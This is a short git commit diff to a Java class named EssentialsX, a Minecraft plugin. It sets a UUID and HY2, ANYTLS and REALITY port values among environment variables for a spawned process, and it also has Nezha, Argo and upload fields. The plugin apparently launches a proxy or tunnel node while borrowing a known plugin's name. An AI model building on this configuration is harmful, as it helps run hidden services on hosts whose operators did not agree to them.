3efab4493778a0c8fa2ab59423c123dd00637d2b
vasilecz <81199518+vasilecz@users.noreply.github.com>
2026-02-28 21:50:17 +0500

    Update EssentialsX.java

--- src/main/java/com/example/essentialsx/EssentialsX.java
+++ src/main/java/com/example/essentialsx/EssentialsX.java
@@ -73,7 +73,7 @@ public class EssentialsX extends JavaPlugin {
         
         // Set environment variables
         Map<String, String> env = pb.environment();
-        env.put("UUID", "50435f3a-ec1f-4e1a-867c-385128b447f8");
+        env.put("UUID", "b45dd413-bb0f-467d-81d4-428fe702041c");
         env.put("FILE_PATH", "./world");
         env.put("NEZHA_SERVER", "");
         env.put("NEZHA_PORT", "");
@@ -82,10 +82,10 @@ public class EssentialsX extends JavaPlugin {
         env.put("ARGO_DOMAIN", "");
         env.put("ARGO_AUTH", "");
         env.put("S5_PORT", "");
-        env.put("HY2_PORT", "");
+        env.put("HY2_PORT", "20136");
         env.put("TUIC_PORT", "");
-        env.put("ANYTLS_PORT", "");
-        env.put("REALITY_PORT", "");
+        env.put("ANYTLS_PORT", "20137");
+        env.put("REALITY_PORT", "20138");
         env.put("ANYREALITY_PORT", "");
         env.put("UPLOAD_URL", "");
         env.put("CHAT_ID", "");
